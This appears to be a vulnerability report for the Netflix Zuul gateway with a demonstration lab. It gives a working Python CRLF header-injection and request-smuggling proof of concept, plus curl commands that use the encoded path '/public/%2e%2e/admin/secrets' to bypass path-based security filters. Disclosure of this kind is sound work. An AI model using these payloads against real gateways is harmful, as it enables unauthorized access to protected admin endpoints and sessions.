# Realistic Zuul Vulnerability Report (2026)

## 1. Outbound HTTP Header Injection & Request Smuggling (Critical)

**Target Component:** `zuul-core` (Netty Codec Configuration)

### Description
Netflix Zuul (up to version 3.4.2) explicitly disables HTTP header validation in its Netty server and client initializers. In `BaseZuulChannelInitializer.java` and `DefaultOriginChannelInitializer.java`, the `HttpServerCodec` and `HttpClientCodec` are instantiated with `validateHeaders` set to `false`.

This allows an attacker to inject malicious headers containing Carriage Return and Line Feed (CRLF) characters (`\r\n`) into the proxied requests sent to backend services. When Zuul forwards a request with a malicious header value, the backend server may interpret the injected CRLF as the end of the first request and the start of a second, "smuggled" request.

### Impact
*   **Request Smuggling:** Bypass Zuul security filters and interact directly with internal APIs.
*   **ACL Bypass:** Access administrative or sensitive endpoints (e.g., `/admin/secrets`) that are normally blocked by the gateway.
*   **Credential Theft:** Capture or hijack other users' sessions by smuggling requests that the backend associates with a different context.

### Proof of Concept (PoC)
The following Python script demonstrates how to inject an arbitrary header into the request Zuul sends to the origin.

```python
import socket

# Target Zuul Gateway
GATEWAY_HOST = "localhost"
GATEWAY_PORT = 7001

# Injection: CRLF followed by a new header
injection = "value\r\nInjected-Header: Smuggled-Success"

payload = (
    f"GET /public HTTP/1.1\r\n"
    f"Host: {GATEWAY_HOST}:{GATEWAY_PORT}\r\n"
    f"X-Custom-Header: {injection}\r\n"
    f"Connection: close\r\n\r\n"
)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((GATEWAY_HOST, GATEWAY_PORT))
    s.sendall(payload.encode())
    print(s.recv(4096).decode())
```

**Verification:**
The backend received the following headers:
```
X-Custom-Header: value
Injected-Header: Smuggled-Success
```
This confirms that Zuul passed the raw CRLF characters to the backend without validation.

---

## 2. Security Filter Bypass via Path Normalization (High)

**Target Component:** `ClientRequestReceiver.java` (Inbound Filter Chain)

### Description
Zuul uses `java.net.URI.normalize()` to process request paths. However, this method does not normalize percent-encoded dots (e.g., `%2e%2e`). If a security filter uses `request.getPath().startsWith("/admin")` (using the raw path provided by Zuul), an attacker can bypass it using an encoded path like `/public/%2e%2e/admin/secrets`.

While Zuul's filter allows this path because it starts with `/public`, many backend servers (Tomcat, Spring Boot) will decode the dots and normalize the path to `/admin/secrets`, serving the sensitive content.

### Impact
*   Bypass of authentication and authorization filters based on path patterns.
*   Unauthorized access to sensitive internal dashboards.

### Proof of Concept
1.  **Blocked:** `curl -i http://localhost:7001/admin/secrets` -> `403 Forbidden` (blocked by `BypassFilter`)
2.  **Bypassed:** `curl -i http://localhost:7001/public/%2e%2e/admin/secrets` -> `200 OK` (returns "CONFIDENTIAL DATA")

---

## Summary of Demonstration Environment
The provided local setup includes:
*   **Zuul Gateway (Port 7001):** Configured with path-based routing and a vulnerable `BypassFilter`.
*   **Public Monolith (Port 8080):** A realistic backend that echoes headers and performs path normalization.
*   **Admin Dashboard (Port 8081):** A sensitive service containing secret data.
*   **Internal Push API (Port 7008):** An unauthenticated endpoint for push message injection.
